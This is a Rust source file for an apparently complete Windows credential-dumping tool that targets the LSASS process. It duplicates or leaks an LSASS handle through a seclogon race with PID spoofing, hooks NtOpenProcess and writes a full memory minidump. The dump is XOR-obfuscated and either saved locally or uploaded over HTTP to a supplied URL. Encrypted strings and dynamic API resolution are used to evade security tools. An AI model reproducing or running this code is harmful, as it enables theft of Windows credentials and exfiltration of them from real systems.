//#![crate_type = "cdylib"]
//cargo rustc -- --crate-type cdylib 
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

extern crate base64;

use bindings::Windows::Win32::Foundation::BOOL;
use bindings::Windows::Win32::System::Threading::{GetCurrentThread, STARTUPINFOW, PROCESS_INFORMATION};
use bindings::Windows::Win32::System::WindowsProgramming::IO_STATUS_BLOCK;
use litcrypt::lc;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use std::io::Cursor;
use std::thread;
use std::{fs::{self, File}, io::{Read, Write}, mem::{size_of}, ptr};
use bindings::Windows::Win32::{Foundation::{HANDLE}, System::{Threading::GetCurrentProcess, WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES, PUBLIC_OBJECT_TYPE_INFORMATION}}};
use data::{PAGE_READONLY, PVOID, SYSTEM_HANDLE_INFORMATION, SYSTEM_HANDLE_TABLE_ENTRY_INFO, PAGE_EXECUTE_READWRITE, THREAD_BASIC_INFORMATION, GENERIC_READ, OVERLAPPED, REQUEST_OPLOCK_INPUT_BUFFER, REQUEST_OPLOCK_OUTPUT_BUFFER, THREAD_ALL_ACCESS, FILE_PROCESS_IDS_USING_FILE_INFORMATION};

static mut STATIC_HANDLE: isize = 0;

//#[no_mangle]
//pub extern "Rust" fn dump(key: &str) {
pub fn dump(key: &str, url: &str, leak: bool) {
    unsafe 
    {
        let lsass_pid = get_pid_from_image_path(&lc!("C:\\Windows\\System32\\lsass.exe")) as u16;
        let mut target_pid = 0u16;
        
        if leak
        {
            target_pid = get_pid_from_image_path(&lc!("C:\\Windows\\System32\\seclogon.dll")) as u16;
        }

        let privilege: u32 = 20; 
        let enable: u8 = 1; 
        let current_thread: u8 = 0;
        let enabled: *mut u8 = std::mem::transmute(&u8::default()); 
       
        //Enable SeDebugPrivilee
        let r = dinvoke::rtl_adjust_privilege(privilege,enable,current_thread,enabled);

        if r != 0 
        {
            println!("{}",&lc!("[x] SeDebugPrivilege could not be enabled."));
            return;
        }
        else 
        {
            println!("{}", &lc!("[+] SeDebugPrivilege successfully enabled."));
        }

        if leak
        {
            force_leakage();
        }

        let shi: *mut SYSTEM_HANDLE_INFORMATION;
        let mut ptr: PVOID;
        let mut buffer;
        let mut bytes = 0x10000;
        let mut c = 0;

        loop
        { 
            buffer =  vec![0u8; bytes as usize];
            ptr = std::mem::transmute(buffer.as_ptr());
            let bytes_ptr: *mut u32 = std::mem::transmute(&bytes);
            // Query the system looking for handles information
            let x = dinvoke::nt_query_system_information(16,ptr,bytes,bytes_ptr);

            if x != 0 
            {
                bytes *= 2;
            }
            else
            {
                shi = std::mem::transmute(ptr);
                break;
            }

            c = c + 1;

            if c > 20
            {
                println!("{}", &lc!("[x] Timeout. Call to NtQuerySystemInformation failed."));
            }
        }     
        
        println!("{}{}{}",&lc!("[+] Retrieved "), (*shi).number_of_handles, &lc!(" handles. Starting analysis..."));
        let mut shtei: *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO = std::mem::transmute(&(*shi).handles);
        for counter in 0..(*shi).number_of_handles 
        {
            
            if counter % 10000 == 0 && counter > 0
            {
                println!("  \\ {} handles have been analyzed so far...", counter);
            }

            if (*shtei).process_id > 4 && (*shtei).process_id != lsass_pid && ((*shtei).process_id == target_pid || target_pid == 0)
            {
                let h = HANDLE::default();
                let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
                let o = OBJECT_ATTRIBUTES::default();
                let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
                let client_id = CLIENT_ID {UniqueProcess: HANDLE{0:(*shtei).process_id as isize}, UniqueThread: HANDLE::default()};
                let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
               
                // PROCESS_DUP_HANDLE as access right
                let x = dinvoke::nt_open_process(
                    handle_ptr,
                    0x0040,
                    object_attributes,
                    client_id
                );

                let handle;
                if x == 0
                {
                    handle = *handle_ptr;
                }
                else 
                {
                    shtei = shtei.add(1);
                    continue;
                };
            

                if handle.0 != 0 && handle.0 != -1
                {
                    let target = HANDLE {0: (*shtei).handle_value as isize};
                    let h = HANDLE::default();
                    let mut dup_handle: *mut HANDLE = std::mem::transmute(&h);
                    let mut desired_access: u32 = 0x0400|0x0010; // PROCESS_QUERY_INFORMATION & PROCESS_VM_READ 
                    let mut options: u32 = 0;

                    // lsass handle obtained from seclogon's race condition cant be upgraded directly, two steps are required
                    // Therefore, we first duplicate the handle with the same access
                    if leak
                    {
                        desired_access = 0;
                        options = 0x00000002; // DUPLICATE_SAME_ACCESS
                    }

                    // Duplicate handle in order to manipulate it
                    let x = dinvoke::nt_duplicate_object(
                        handle,
                        target,
                        GetCurrentProcess(),
                        dup_handle,
                        desired_access, 
                        0,
                        options
                    );

                    if x != 0 
                    {
                        shtei = shtei.add(1);
                        let _r = dinvoke::close_handle(handle).unwrap();
                        continue;
                    }
                                       
                    let poti = PUBLIC_OBJECT_TYPE_INFORMATION::default();
                    let poti_ptr: PVOID = std::mem::transmute(&poti);
                    let l = u32::default();
                    let ret_lenght: *mut u32 = std::mem::transmute(&l);

                    // We obtain information about the handle. Two calls to NtQueryObject are required in order to make it work.
                    let _ = dinvoke::nt_query_object(
                        *dup_handle,
                        2,
                        poti_ptr,
                        size_of::<PUBLIC_OBJECT_TYPE_INFORMATION>() as u32,
                        ret_lenght
                    );

                    let buffer = vec![0u8; *ret_lenght as usize];
                    let poti_ptr: PVOID = std::mem::transmute(buffer.as_ptr());

                    let x = dinvoke::nt_query_object(
                        *dup_handle,
                        2,
                        poti_ptr,
                        *ret_lenght,
                        ret_lenght
                    );

                    if x != 0 
                    {
                        let _r = dinvoke::close_handle(*dup_handle).unwrap();
                        let _r = dinvoke::close_handle(handle).unwrap();
                        shtei = shtei.add(1);
                        continue;
                    }

                    let poti_ptr: *mut PUBLIC_OBJECT_TYPE_INFORMATION = std::mem::transmute(poti_ptr);
                    let poti = *poti_ptr;
                    let mut type_name: String = "".to_string();
                    let mut buffer: *mut u8 = poti.TypeName.Buffer.0 as *mut u8;
                    for _i in 0..poti.TypeName.Length
                    {
                        if *buffer as char != '\0'
                        {
                            type_name.push(*buffer as char);
                        }
                        buffer = buffer.add(1);

                    }

                    // We have a process handle
                    if type_name.to_lowercase() == "process"
                    {
                        if leak
                        {
                            let f = HANDLE::default();
                            let full_access_handle: *mut HANDLE = std::mem::transmute(&f);
                            // We need to upgrade our lsass handle to full accesss in order to be able to dump the memory content
                            let x = dinvoke::nt_duplicate_object(
                                *dup_handle,
                                GetCurrentProcess(),
                                GetCurrentProcess(),
                                full_access_handle,
                                THREAD_ALL_ACCESS, 
                                0,
                                0
                            );
    
                            if x != 0 
                            {
                                shtei = shtei.add(1);
                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                let _r = dinvoke::close_handle(handle).unwrap();
                                continue;
                            }
                            
                            let _r = dinvoke::close_handle(*dup_handle).unwrap();
                            dup_handle = full_access_handle;
    
                        }

                        let len = 500usize; // I dont really think it does exist a process image name longer than 500 characters
                        let buffer = vec![0u8; len];
                        let buffer: *mut u16 = std::mem::transmute(buffer.as_ptr());
                        let ret_len: *mut u32 = std::mem::transmute(&len);
                        let z = dinvoke::query_full_process_image_name(
                            *dup_handle,
                            0,
                            buffer,
                            ret_len
                        );

                        if z == 0 
                        {                         
                            shtei = shtei.add(1);
                            let _r = dinvoke::close_handle(*dup_handle).unwrap();
                            let _r = dinvoke::close_handle(handle).unwrap();
                            continue;
                        }

                        let mut image_name: String = "".to_string();
                        let mut buff: *mut u8 = std::mem::transmute(buffer);
                        for _i in 0..(*ret_len) * 2 // Each char is followed by \0. Lovely LPWSTR...
                        {
                            if *buff as char != '\0' 
                            {
                                image_name.push(*buff as char);
                            }
                            buff = buff.add(1);
                        }
                        
                        let temp = (*dup_handle).0;
                        // We have a valid process handled
                        if image_name.contains(&lc!("lsass.exe"))
                        {             
                            println!("{}.", &lc!("[+] Valid handle to lssas found"));

                            // This is required due to Rust optimizations in order to keep the handle active.
                            let new_handle = HANDLE { 0: temp};
                            let dup_handle: *mut HANDLE = std::mem::transmute(&new_handle); 
                            (*dup_handle).0 = temp;

                            let description = "\0\0".as_ptr() as *mut u16;
                            let z = dinvoke::create_transaction(
                                ptr::null_mut(),
                                ptr::null_mut(),
                                0,
                                0,
                                0,
                                0,
                                description
                            );

                            let transaction_handle: HANDLE;                           
                            if z.0 == -1 
                            {
                                shtei = shtei.add(1);
                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                let _r = dinvoke::close_handle(handle).unwrap();

                                println!("{}", &lc!("[x] Transaction creation failed."));
                                continue;
                            }
                            else
                            {
                                transaction_handle = z;
                            }

                            let m = 0xffffu32;
                            let mini: *const u32 = std::mem::transmute(&m);
                            let rand_string: String = thread_rng()
                            .sample_iter(&Alphanumeric)
                            .take(20)
                            .map(char::from)
                            .collect();

                            let file_name = format!(".\\{}{}", rand_string, ".log");
                            let file_name = file_name.as_ptr() as *mut u8;
                            let z = dinvoke::create_file_transacted(
                                file_name,
                                0x80000000 | 0x40000000,
                                0x00000002,
                                ptr::null(),
                                0x00000001, 
                                0x100 | 0x04000000,
                                HANDLE::default(),
                                transaction_handle,
                                mini,
                                ptr::null_mut()
                            );

                            let transacted_file_handle: HANDLE;
                            if z.0 == -1 
                            {                                
                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
                                let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                let _r = dinvoke::close_handle(handle).unwrap();
                                shtei = shtei.add(1);

                                println!("{}", &lc!("[x] Transacted file creation failed."));
                                continue;
                            }
                            else
                            {
                                transacted_file_handle = z;
                            }

                            STATIC_HANDLE = (*dup_handle).0.clone();

                            if !hook()
                            {
                                println!("{}", &lc!("[x] Could not hook NtOpenProcess."));
                                return;
                            }

                            // We use the duplicated handle to dump the process memory
                            let x = dinvoke::mini_dump_write_dump(
                                *dup_handle,
                                lsass_pid.into(),
                                transacted_file_handle,
                                0x00000002, // MiniDumpWithFullMemory
                                ptr::null_mut(),
                                ptr::null_mut(),
                                ptr::null_mut()
                            );
                            
                            if x == 1 
                            {
                                println!("{}",&lc!("[!] Lsass dump created!"));

                                let dump_size = dinvoke::get_file_size(
                                    transacted_file_handle,
                                    ptr::null_mut()
                                );

                                let z = dinvoke::create_file_mapping(
                                    transacted_file_handle,
                                    ptr::null(),
                                    PAGE_READONLY,
                                    0,
                                    0,
                                    ptr::null_mut()
                                );


                                let map_handle: HANDLE;
                                if z.0 == -1 
                                {
                                    shtei = shtei.add(1);
                                    let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                    let _r = dinvoke::close_handle(transaction_handle).unwrap();
                                    let _r = dinvoke::close_handle(*dup_handle).unwrap();
                                    let _r = dinvoke::close_handle(handle).unwrap();
                                    continue;
                                }
                                else
                                {
                                    map_handle = z;
                                }
                                  
                                let ret = dinvoke::map_view_of_file(
                                    map_handle,
                                    4, // FILE_MAP_READ
                                    0,
                                    0,
                                    0
                                );

                                let mut view_ptr = ret as *mut u8;

                                let key = format!("{}{}", key, "\0");
                                let mut key_ptr = key.as_ptr();
                                let mut xor_key: u8 = *key_ptr;
                                key_ptr = key_ptr.add(1);
                                while *key_ptr != '\0' as u8
                                {
                                    xor_key = xor_key ^ *key_ptr;
                                    key_ptr = key_ptr.add(1);
                                }

                                let mut view_xor: Vec<u8> = vec![];
                                for _i in 0..dump_size
                                {
                                    view_xor.push(*view_ptr ^ xor_key);
                                    view_ptr = view_ptr.add(1);
                                }
                               
                                let rand_string: String = thread_rng()
                                .sample_iter(&Alphanumeric)
                                .take(7)
                                .map(char::from)
                                .collect();

                                if url == ""
                                {           
                                    let holder: Vec<u8> = vec![0;dump_size as usize + 1];
                                    let mut h: *mut u8 = holder.as_ptr() as *mut u8;
                                    h = h.add(1);
                                    std::ptr::copy_nonoverlapping(view_xor.as_ptr() as *const _, h, dump_size as usize);      
                                    let output_path = format!("{}{}", rand_string, ".txt");
                                    let mut file = std::fs::File::create(&output_path).unwrap();
                                    let _r = file.write(holder.as_slice()).unwrap();

                                    println!("{} {}.", &lc!("[+] Memory dump written to file"), output_path.as_str());

                                }
                                else
                                {
                                    let rand_boundary: String = thread_rng()
                                    .sample_iter(&Alphanumeric)
                                    .take(16)
                                    .map(char::from)
                                    .collect();

                                    let boundary: &str = &format!("{},{}", "------------------------", rand_boundary);
                                    let mut data = Vec::new();
                                    let _ = write!(data, "--{}\r\n", boundary);
                                    let _ = write!(data, "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"\r\n", rand_string);
                                    let _ = write!(data, "Content-Type: text/plain\r\n");
                                    let _ = write!(data, "\r\n");

                                    let _ = write!(data, "{}", base64::encode(&view_xor));
                                    let _ = write!(data, "\r\n"); // The key thing you are missing
                                    let _ = write!(data, "--{}--\r\n", boundary);

                                    let read = Cursor::new(&data);
                                    let cont_type = format!("multipart/form-data; boundary={}", boundary);
                                    let _ = ureq::post(url)
                                        .set("content-type",cont_type.as_str()) 
                                        .set("Content-Length", data.len().to_string().as_str())
                                        .send(read);

                                    println!("{}", &lc!("[+] File uploaded."));
                                }

                                let _unmap = dinvoke::unmap_view_of_file(ret);
                                let _ret = dinvoke::rollback_transaction(transaction_handle);

                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                let _r = dinvoke::close_handle(map_handle).unwrap();
                                let _r = dinvoke::close_handle(transaction_handle).unwrap();

                                return;
                            }
                            else 
                            {
                                println!("{}", &lc!("[x] Call to MiniDumpWriteDump failed."));
                                let _r = dinvoke::close_handle(transacted_file_handle).unwrap();
                                let _r = dinvoke::close_handle(transaction_handle).unwrap();
                            }                           
                        }
                    }

                    let _r = dinvoke::close_handle(*dup_handle).unwrap();
                }

                let _r = dinvoke::close_handle(handle).unwrap();
            }

            shtei = shtei.add(1);
            
        } 
        
        println!("{}", &lc!("[x] Could not retrieve a valid handle. Exiting."));

    }
}

pub fn force_leakage() 
{
    unsafe
    {
        let mut file: Vec<u16> = lc!("c:\\Windows\\System32\\license.rtf").encode_utf16().collect();
        file.push(0);

        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let create_file: data::CreateFile;
        let create_file_r: Option<HANDLE>;
        // 3 = OPEN_EXISTING
        // 0x40000000 = FILE_FLAG_OVERLAPPED
        dinvoke::dynamic_invoke!(k32,&lc!("CreateFileW"),create_file,create_file_r,file.as_ptr() as *const u16,GENERIC_READ,0,ptr::null(),3,0x40000000,HANDLE {0: 0});

        let file_handle = create_file_r.unwrap();
        
        let mut overlapped: OVERLAPPED = OVERLAPPED::default();
        let create_event: data::CreateEvent;
        let create_event_r: Option<HANDLE>;
        dinvoke::dynamic_invoke!(k32,&lc!("CreateEventW"),create_event,create_event_r,ptr::null(),false,false,ptr::null());

        overlapped.event_handle = create_event_r.unwrap();

        let mut input_buffer = REQUEST_OPLOCK_INPUT_BUFFER::default();
        let mut output_buffer = REQUEST_OPLOCK_OUTPUT_BUFFER::default(); 
        input_buffer.structure_version = 1; // REQUEST_OPLOCK_CURRENT_VERSION
        input_buffer.structure_length = size_of::<REQUEST_OPLOCK_INPUT_BUFFER>() as u16;
        input_buffer.requested_oplock_level = 0x00000001 | 0x00000002; // OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE
        input_buffer.flags = 0x00000001; // REQUEST_OPLOCK_INPUT_FLAG_REQUEST
        output_buffer.structure_version = 1;
        output_buffer.structure_length = size_of::<REQUEST_OPLOCK_OUTPUT_BUFFER>() as u16;
        let input: PVOID = std::mem::transmute(&input_buffer);
        let output: PVOID = std::mem::transmute(&output_buffer);
        let over: *mut OVERLAPPED = std::mem::transmute(&overlapped);
        let unsued = 0u32;
        let bytes_ret: *mut u32 = std::mem::transmute(&unsued);
        let device_oi_control: data::DeviceIoControl;
        let _r: Option<BOOL>;
        let fsctl_request_oplockc = ((0x00000009)<<16) | ((0) <<14) | ((144)<<2) | (0);
        dinvoke::dynamic_invoke!(k32,&lc!("DeviceIoControl"),device_oi_control,_r,file_handle,fsctl_request_oplockc,input,size_of::<REQUEST_OPLOCK_INPUT_BUFFER>() as u32,
                                output, size_of::<REQUEST_OPLOCK_OUTPUT_BUFFER>() as u32, bytes_ret, over);
        

        let get_last_error: unsafe extern "system" fn () -> u32;
        let get_last_error_r: Option<u32>;
        dinvoke::dynamic_invoke!(k32,&lc!("GetLastError"),get_last_error,get_last_error_r,);
        // 997 = ERROR_IO_PENDING
        if get_last_error_r.unwrap() != 997
        {
            println!("{}",&lc!("[x] Handle leakage failed."));
            return;
        }

        thread::spawn(|| 
            {
                let tbi: *mut THREAD_BASIC_INFORMATION;
                let mut ptr: PVOID;
                let mut buffer;
                let mut bytes = 48u32;
                let mut c = 0;
        
                loop
                { 
                    buffer =  vec![0u8; bytes as usize];
                    ptr = std::mem::transmute(buffer.as_ptr());
                    let re = 0u32;
                    let bytes_ptr: *mut u32 = std::mem::transmute(&re);
                    // Get current thread's basic information
                    let x = dinvoke::nt_query_information_thread(GetCurrentThread(), 0,ptr,bytes,bytes_ptr);
        
                    if x != 0 
                    {
                        bytes = *bytes_ptr;
                    }
                    else
                    {
                        tbi = std::mem::transmute(ptr);
                        break;
                    }
        
                    c = c + 1;
        
                    if c > 20
                    {
                        println!("{}", &lc!("[x] Timeout. Call to NtQueryInformationThread failed."));
                    }
                }     
           
                let teb: *mut ntapi::ntpebteb::TEB = std::mem::transmute((*tbi).teb_base_address);
                let spoofed_pid = get_pid_from_image_path(&lc!("C:\\Windows\\system32\\lsass.exe")) as isize;
                let dst_ptr: *mut CLIENT_ID  = std::mem::transmute(&(*teb).ClientId);
                let spoofed_pid = CLIENT_ID {UniqueProcess:HANDLE {0: spoofed_pid}, UniqueThread: (*tbi).client_id.UniqueThread};
                let src_ptr: *mut CLIENT_ID = std::mem::transmute(&spoofed_pid);

                // TEB pid spoofing
                std::ptr::copy_nonoverlapping(src_ptr, dst_ptr, 1);
        
                let adv = dinvoke::get_module_base_address(&lc!("advapi32.dll"));
                let create_process_with_logon: data::CreateProcessWithLogon;
                let _create_process_with_logon_r: Option<BOOL>;
                let mut username: Vec<u16> = lc!("username").encode_utf16().collect();
                username.push(0);
                let mut domain: Vec<u16> = lc!("domain").encode_utf16().collect();
                domain.push(0);
                let mut pass: Vec<u16> = lc!("password").encode_utf16().collect();
                pass.push(0);
                let mut file: Vec<u16> = lc!("c:\\Windows\\System32\\license.rtf").encode_utf16().collect();
                file.push(0);
                let startup = vec![0u8;size_of::<STARTUPINFOW>()];
                let startupinfo: *const STARTUPINFOW = std::mem::transmute(startup.as_ptr());
                let p = PROCESS_INFORMATION::default();
                let process_information: *mut PROCESS_INFORMATION = std::mem::transmute(&p);

                // 0x00000002 = LOGON_NETCREDENTIALS_ONLY 
                dinvoke::dynamic_invoke!(adv,&lc!("CreateProcessWithLogonW"),create_process_with_logon,_create_process_with_logon_r,username.as_ptr() as *const u16,
                                        domain.as_ptr() as *const u16, pass.as_ptr() as *const u16,0x00000002,ptr::null(),file.as_ptr() as *mut u16,0,
                                        ptr::null(),ptr::null(),startupinfo,process_information);
                
        });

        let d = u32::default();
        let dw_bytes: *mut u32 = std::mem::transmute(&d);
        let get_overlapped_result: data::GetOverlappedResult;
        let get_overlapped_result_r: Option<BOOL>;
        dinvoke::dynamic_invoke!(k32,&lc!("GetOverlappedResult"),get_overlapped_result,get_overlapped_result_r,file_handle,over,dw_bytes,true);
        if !get_overlapped_result_r.unwrap().as_bool()
        {
            println!("{}", &lc!("[x] Something went wrong."));
            return;
        }
        else 
        {
            println!("{}", &lc!("[+] Handle to lsass leaked."));
        }
    }
}

pub fn get_pid_from_image_path(path: &str) -> usize
{
    unsafe
    {
        let mut file: Vec<u16> = path.encode_utf16().collect();
        file.push(0);
        let k32 = dinvoke::get_module_base_address(&lc!("kernel32.dll"));
        let create_file: data::CreateFile;
        let create_file_r: Option<HANDLE>;
        // 0x80 = FILE_READ_ATTRIBUTES
        // 3 = OPEN_EXISTING
        // 0x00000001|0x00000002|0x00000004 = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
        dinvoke::dynamic_invoke!(k32,&lc!("CreateFileW"),create_file,create_file_r,file.as_ptr() as *const u16,0x80,0x00000001|0x00000002|0x00000004,ptr::null(),
                                3,0,HANDLE {0: 0});
        
        let file_handle = create_file_r.unwrap();

        let fpi: *mut FILE_PROCESS_IDS_USING_FILE_INFORMATION;
        let ios: Vec<u8> = vec![0u8; size_of::<IO_STATUS_BLOCK>()];
        let iosb: *mut IO_STATUS_BLOCK = std::mem::transmute(&ios);
        let mut ptr: PVOID;
        let mut buffer;
        let mut bytes = size_of::<FILE_PROCESS_IDS_USING_FILE_INFORMATION>() as u32;
        let mut c = 0;

        loop
        { 
            buffer =  vec![0u8; bytes as usize];
            ptr = std::mem::transmute(buffer.as_ptr());
            // 47 = FileProcessIdsUsingFileInformation
            let x = dinvoke::nt_query_information_file(file_handle, iosb,ptr,bytes,47);

            if x != 0 
            {
                bytes *= 2;
            }
            else
            {
                fpi = std::mem::transmute(ptr);
                let _r = dinvoke::close_handle(file_handle);
                // Access denied error pops if this pointer is not liberated.
                (*iosb).Anonymous.Pointer = ptr::null_mut();
                return (*fpi).process_id_list[0];
            }

            c = c + 1;

            if c > 20
            {
                println!("{}", &lc!("[x] Timeout. Call to NtQueryInformationFile failed."));
                break;
            }
        } 

        let _r = dinvoke::close_handle(file_handle);

        0
    }
}

pub fn hook () -> bool
{
    unsafe 
    {
        let detour = nt_open_process_detour as fn (*mut HANDLE, u32, *mut OBJECT_ATTRIBUTES, *mut CLIENT_ID) -> i32;
        let detour_addresss: usize = std::mem::transmute(detour);

        let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
        let handle = GetCurrentProcess();
        let ntop_base_address = dinvoke::get_function_address(ntdll, &lc!("NtOpenProcess"));
        let base_address: *mut PVOID = std::mem::transmute(&ntop_base_address);
        let size = 13 as usize; // for x64 processor
        let size: *mut usize = std::mem::transmute(&size);
        let o = u32::default();
        let old_protection: *mut u32 = std::mem::transmute(&o);

        let z = dinvoke::nt_protect_virtual_memory( 
            handle,
            base_address,
            size,
            PAGE_EXECUTE_READWRITE,
            old_protection
        );


        if z != 0
        {
            return false;
        }


        let ntop_ptr = ntop_base_address as *mut u8;

        if cfg!(target_pointer_width = "64") {

            *ntop_ptr = 0x49;
            *(ntop_ptr.add(1)) = 0xBB;
            *(ntop_ptr.add(2) as *mut usize) = detour_addresss;
            *(ntop_ptr.add(10)) = 0x41;
            *(ntop_ptr.add(11)) = 0xFF;
            *(ntop_ptr.add(12)) = 0xE3;
    
        } 
        else 
        {
            *ntop_ptr = 0x68;
            *(ntop_ptr.add(1) as *mut usize) = detour_addresss;
            *(ntop_ptr.add(5)) = 0xC3
        } 
        
        let u = u32::default();
        let unused: *mut u32 = std::mem::transmute(&u);

        let z = dinvoke::nt_protect_virtual_memory(
            handle,
            base_address,
            size,
            *old_protection,
            unused
        );


        if z != 0
        {
            return false;
        }

        println!("{}", &lc!("[+] NtOpenProcess hooked."));

        true
    }

}

pub fn nt_open_process_detour (mut _process_handle: *mut HANDLE, _access: u32, _object_attributes: *mut OBJECT_ATTRIBUTES, _client_id: *mut CLIENT_ID)  -> i32
{
    unsafe 
    {   
        let dup_handle = HANDLE{0: STATIC_HANDLE};
        let _  = dinvoke::set_handle_information(
            dup_handle,
            0x00000002, // HANDLE_FLAG_PROTECT_FROM_CLOSE
            0x00000002
        );

        _process_handle = std::mem::transmute(&dup_handle);

        0
    }
}

pub fn decrypt (file_path: &str, key: &str, output_file: &str) 
{
    unsafe{

        let mut file = File::open(file_path).expect("[x] Error opening input file.");
        let metadata = fs::metadata(file_path).unwrap();
        let mut buffer = vec![];
        file.read_to_end(&mut buffer).unwrap();


        let mut buffer_ptr = buffer.as_ptr().add(1);
        let key = format!("{}{}", key, "\0");
        let mut key_ptr = key.as_ptr();
        let mut xor_key: u8 = *key_ptr;
        key_ptr = key_ptr.add(1);
        while *key_ptr != '\0' as u8
        {
            xor_key = xor_key ^ *key_ptr;
            key_ptr = key_ptr.add(1);
        }

        let mut file_content: Vec<u8> = vec![];
        for _i in 0..metadata.len()
        {
            file_content.push(*buffer_ptr ^ xor_key);
            buffer_ptr = buffer_ptr.add(1);
        }

        let mut output = std::fs::File::create(output_file).unwrap();
        let _r = output.write_all(&file_content).unwrap();
    }

    println!("{}", &lc!("[+] Successfully decrypted minidump file."))

}
